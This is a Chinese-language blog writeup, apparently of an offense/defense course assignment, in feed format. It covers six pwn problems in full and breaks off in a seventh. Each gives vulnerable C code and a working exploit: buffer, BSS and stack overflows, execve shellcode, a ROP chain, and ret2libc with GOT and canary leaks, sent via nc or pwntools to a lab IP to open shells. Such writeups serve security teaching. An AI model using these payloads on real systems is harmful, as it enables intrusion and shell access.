    <title><![CDATA[攻防Project1 Writeup]]></title>
    <link href="http://w181496.twbbs.org/2016/01/16/project1/"/>
    <id>http://w181496.twbbs.org/2016/01/16/project1/</id>
    <published>2016-01-16T15:10:19.000Z</published>
    <updated>2016-11-24T12:02:23.000Z</updated>
    <content type="html"><![CDATA[<h2 id="u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D"><a href="#u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D" class="headerlink" title="第一題：BOF easy [ pwn ]"></a>第一題：BOF easy [ pwn ]</h2><h3 id="u984C_u76EE"><a href="#u984C_u76EE" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrat !!Congrat"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Buffer overerflow is easy"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Read your input :"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(fflush0,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF"><a href="#u89E3_u984C_u601D_u8DEF" class="headerlink" title="解題思路"></a>解題思路</h3><p>l33t()中有system(“/bin/sh”)，所以目標就是執行l33t()<br>由code可知buf長度20，但read()讀100個bytes，代表這裡可以buffer overflow<br>並且這題沒有ASLR，所以用objdump可以找出l33t()的address為0x80484fd<br>接著，只需要將main()的return address蓋成0x80484fd即可<br>payload:<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(perl -e &#39;print &#34;A&#34;x32, &#34;\xfd\x84\x04\x08&#34;&#39;;cat) | nc 140.115.53.13 11001</span><br></pre></td></tr></table></figure></p>
<h2 id="u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D"><a href="#u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D" class="headerlink" title="第二題：BSS overflow [pwn]"></a>第二題：BSS overflow [pwn]</h2><h3 id="u984C_u76EE-1"><a href="#u984C_u76EE-1" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">char</span> *filename;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	FILE *fp ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">2704</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name ?"</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	filename = <span class="string">"/home/bssof/welcome"</span>;</span><br><span class="line">	gets(name);</span><br><span class="line">	fp = fopen(filename,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Error !!"</span>);</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fread(buf,<span class="number">2704</span>,<span class="number">1</span>,fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Goodbye ~ %s\n"</span>,name);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-1"><a href="#u89E3_u984C_u601D_u8DEF-1" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題因為使用gets()，明顯地，name可以buffer overflow<br>而name和filename都在BSS段，我們可以知道name往下蓋會蓋到filename<br>所以這題如果先把flag的位置寫到name中，再往下把filename蓋成指向name的位置<br>這樣fopen就會幫我們把flag的內容讀出來!</p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;print &#34;/home/bssof/flag&#34;,&#34;\x00&#34;x184,&#34;\x60\xa0\x04\x08&#34;&#39; | nc 140.115.53.13 11000</span><br></pre></td></tr></table></figure></p>
<h2 id="u7B2C_u4E09_u984C_uFF1AShellcode_Injection__5Bpwn_5D"><a href="#u7B2C_u4E09_u984C_uFF1AShellcode_Injection__5Bpwn_5D" class="headerlink" title="第三題：Shellcode Injection [pwn]"></a>第三題：Shellcode Injection [pwn]</h2><h3 id="u984C_u76EE-2"><a href="#u984C_u76EE-2" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The buffer of your input %p\n"</span>,buf);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Can you pwn it ?"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your input : "</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Goodbye ~"</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-2"><a href="#u89E3_u984C_u601D_u8DEF-2" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題一樣gets()會導致buffer overflow發生<br>然後這題沒有DEP保護，所以可以寫shellcode進buf來執行<br>但是這題有ASLR，所以code開頭很好心的把buf位置印出來</p>
<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11002</span>)</span><br><span class="line">r.recvuntil(<span class="string">'The buffer of your input '</span>)</span><br><span class="line">addr = r.recvline() <span class="comment"># get the address of buffer</span></span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line"><span class="comment"># execv('bin/sh') 25 bytes</span></span><br><span class="line">r.send(<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e \x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span> + <span class="string">"A"</span>*<span class="number">87</span> + p32(int(addr,<span class="number">16</span>)) + <span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="u7B2C_u56DB_u984C_uFF1AROP_beginner__5Bpwn_5D"><a href="#u7B2C_u56DB_u984C_uFF1AROP_beginner__5Bpwn_5D" class="headerlink" title="第四題：ROP beginner [pwn]"></a>第四題：ROP beginner [pwn]</h2><h3 id="u984C_u76EE-3"><a href="#u984C_u76EE-3" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"ROP is easy is'nt it ?"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your input :"</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-3"><a href="#u89E3_u984C_u601D_u8DEF-3" class="headerlink" title="解題思路"></a>解題思路</h3><p>看這題code那麼短，加上題目提到ROP，所以猜測這題執行檔是用靜態編譯<br>應該有夠多ROP gadget可以組shell<br>直接拿ROPgadget組ROP chain<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop_beginner --ropchain</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/envpython2</span></span><br><span class="line"><span class="comment">#execve generated by ROPgadget</span></span><br><span class="line"><span class="comment">#ROPgadget --binary rop_beginner --ropchain</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#Padding goes here</span></span><br><span class="line">p=<span class="string">''</span></span><br><span class="line">p+=<span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080bae06</span>)</span><br><span class="line">p+=<span class="string">'/bin'</span></span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea064</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080bae06</span>)</span><br><span class="line">p+=<span class="string">'//sh'</span></span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x08054250</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0809a15d</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080481c9</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e851</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea060</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0806e82a</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080ea068</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x08054250</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x0807b27f</span>)</span><br><span class="line">p+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x080493e1</span>)</span><br><span class="line"><span class="keyword">print</span> p</span><br></pre></td></tr></table></figure></p>
<h2 id="u7B2C_u4E94_u984C_3AReturn_to_library__5Bpwn_5D"><a href="#u7B2C_u4E94_u984C_3AReturn_to_library__5Bpwn_5D" class="headerlink" title="第五題:Return to library [pwn]"></a>第五題:Return to library [pwn]</h2><h3 id="u984C_u76EE-4"><a href="#u984C_u76EE-4" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">See_something</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *address ;</span><br><span class="line">	address = (<span class="keyword">int</span> *)addr ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The content of the address : %p\n"</span>,*address);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *mesg)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">48</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,mesg);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Your message is : %s"</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> address[<span class="number">10</span>] ;</span><br><span class="line">	<span class="keyword">char</span> message[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr ;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Do you know return to library ?"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"What do you want to see in memory?"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Give me an address (in dec) :"</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,address,<span class="number">10</span>);</span><br><span class="line">	addr = strtol(address);</span><br><span class="line">	See_something(addr) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Leave some message for me :"</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,message,<span class="number">256</span>);</span><br><span class="line">	Print_message(message);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Thanks you ~"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-4"><a href="#u89E3_u984C_u601D_u8DEF-4" class="headerlink" title="解題思路"></a>解題思路</h3><p>這題有DEP保護<br>一開始先找出puts的got位址，因為程式一開始可以讓我們讀某個 address的內容，我們就塞這個got給他，讓他讀puts真正位址<br>根據 base + offset = address，我們把得到的位址減掉offset就能找出 base address，再⽤base + system offset就能得到system的位址 如此一來就能控制return address跳到system，並且system的參數(/bin/sh)位址也能從libc.so取得(⼀樣是offset + base)</p>
<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">puts_got = <span class="number">0x804a01c</span></span><br><span class="line">puts_off = <span class="number">0x64c10</span></span><br><span class="line">gets_off = <span class="number">0x642b0</span></span><br><span class="line">system_off = <span class="number">0x3fcd0</span></span><br><span class="line">sh_off = <span class="number">0x15da84</span></span><br><span class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11004</span>)</span><br><span class="line">r.send(<span class="string">"134520860"</span> + <span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">'The content of the address : '</span>)</span><br><span class="line">puts_addr = r.recvline()</span><br><span class="line">base = int(puts_addr,<span class="number">16</span>) - puts_off</span><br><span class="line">gets_addr = base + gets_off</span><br><span class="line">system_addr = base + system_off</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">60</span> + p32(system_addr) + <span class="string">"A"</span>*<span class="number">4</span> + p32(sh_off + base) + <span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="u7B2C_u516D_u984C_uFF1ASimple_echo__5Bpwn_5D"><a href="#u7B2C_u516D_u984C_uFF1ASimple_echo__5Bpwn_5D" class="headerlink" title="第六題：Simple echo [pwn]"></a>第六題：Simple echo [pwn]</h2><h3 id="u984C_u76EE-5"><a href="#u984C_u76EE-5" class="headerlink" title="題目"></a>題目</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	char buf[128];</span><br><span class="line">	setvbuf(stdout,0,2,0);</span><br><span class="line">	puts("####################");</span><br><span class="line">	puts(" Simple echo server");</span><br><span class="line">	puts("####################");</span><br><span class="line">	puts("Enter exit to quit ");</span><br><span class="line">	while(1)&#123;</span><br><span class="line">		memset(buf,0,128);</span><br><span class="line">		printf("Input : ");</span><br><span class="line">		read(0,buf,256);</span><br><span class="line">		buf[136] = '\x00';</span><br><span class="line">		usleep(400000);</span><br><span class="line">		if(!memcmp(buf,"exit",4))&#123;</span><br><span class="line">			break ;</span><br><span class="line">		&#125;</span><br><span class="line">		puts("");</span><br><span class="line">		printf("echo %s",buf);</span><br><span class="line">	&#125;</span><br><span class="line">	puts("goodbye~");</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-5"><a href="#u89E3_u984C_u601D_u8DEF-5" class="headerlink" title="解題思路"></a>解題思路</h3><p>首先，這題有開StackGuard，所以單純buffer overflow會被偵測，必須想辦法先知道canary的值，然後去做buffer overflow就能避開canary修改偵測(還原canary)<br>具體實現是先塞128字元的垃圾進去，他會把\x00前的東⻄印出來，包括buf[136]前的東西，也就是canary!<br>所以我們就有辦法控制 return address而不被StackGuard偵測，再來因為有DEP，我們一樣要用到PLT/GOT，先想辦法leak GOT裡面的某個函數位址 (這裏我leak puts())，然後算出base address，就能像上題那樣直接call system(“/bin/sh”)。要leak puts的GOT內容，可以把main return address蓋成puts的PLT，然後參數放GOT位址去leak memory 內容。<br>整個stack分佈大概是⻑這樣:<br>padding + canary + padding + puts@plt + main_address + puts@got</p>
<p>這樣就可以用 base + offset = address來求base<br>要再call main的原因是因為我leak出來之後還要再接著call system，所以就讓程式再跑⼀次，重新做⼀次overflow，把return address蓋成system()位址</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">11005</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input :"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">128</span> + <span class="string">"\n"</span>)</span><br><span class="line">a = r.recvuntil(<span class="string">"Input :"</span>)</span><br><span class="line">puts_plt = <span class="number">0x08048470</span></span><br><span class="line">puts_got = <span class="number">0x804a020</span></span><br><span class="line">main = <span class="number">0x080485bd</span></span><br><span class="line">gets_off = <span class="number">0x642b0</span></span><br><span class="line">puts_off = <span class="number">0x64c10</span></span><br><span class="line">system_off = <span class="number">0x3fcd0</span></span><br><span class="line">sh_off = <span class="number">0x15da84</span></span><br><span class="line">r.send(<span class="string">"exit"</span> + <span class="string">"A"</span>*<span class="number">124</span> + <span class="string">"\x00"</span> + a[<span class="number">136</span>:<span class="number">139</span>] + <span class="string">"A"</span>*<span class="number">12</span> + p32(puts_plt) + p32(main) + p32(puts_got) + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvline()</span><br><span class="line">tmp = r.recvline()</span><br><span class="line"><span class="keyword">print</span> enhex(tmp)</span><br><span class="line">base = u32(tmp[<span class="number">0</span>:<span class="number">4</span>]) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Base = "</span>, hex(base)</span><br><span class="line">gets = base + gets_off</span><br><span class="line">system = base + system_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main = "</span>, hex(main)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system = "</span>, hex(system)</span><br><span class="line">r.send(<span class="string">"exit"</span> + <span class="string">"A"</span>*<span class="number">124</span> + <span class="string">"\x00"</span> + a[<span class="number">136</span>:<span class="number">139</span>] + <span class="string">"A"</span>*<span class="number">5</span> + <span class="string">"\x85\x04\x08"</span> + p32(system) + p32(puts_got) + p32(sh_off+base) + <span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="u7B2C_u4E03_u984C_3ABubble_sort__5Bpwn_5D"><a href="#u7B2C_u4E03_u984C_3ABubble_sort__5Bpwn_5D" class="headerlink" title="第七題:Bubble sort [pwn]"></a>第七題:Bubble sort [pwn]</h2><h3 id="u984C_u76EE-6"><a href="#u984C_u76EE-6" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> n,i,j ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tmp ;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"How many numbers do you have ?"</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;n);</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Enter the %d number : "</span>,i);</span><br><span class="line">			fflush(<span class="built_in">stdout</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;buf[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span 